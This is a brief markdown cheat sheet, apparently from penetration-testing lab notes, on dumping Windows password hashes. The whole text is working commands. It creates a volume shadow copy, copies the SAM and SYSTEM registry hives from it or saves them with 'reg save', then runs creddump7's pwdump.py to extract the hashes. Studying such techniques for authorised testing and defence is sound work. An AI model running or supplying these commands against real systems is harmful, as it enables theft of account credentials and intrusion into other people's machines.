# Create shadowcopy
```
wmic shadowcopy call create Volume='C:\'
vssadmin list shadows
```
# Copy files
```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system
```
## Or
```
reg save HKLM\sam C:\users\offsec.corp1\Downloads\sam
reg save HKLM\system C:\users\offsec.corp1\Downloads\system
```
# Decrypt
## Python3 port sudo git clone https://github.com/ict/creddump7.git
```
python3 pwdump.py /home/kali/data/system1 /home/kali/data/sam1 
```
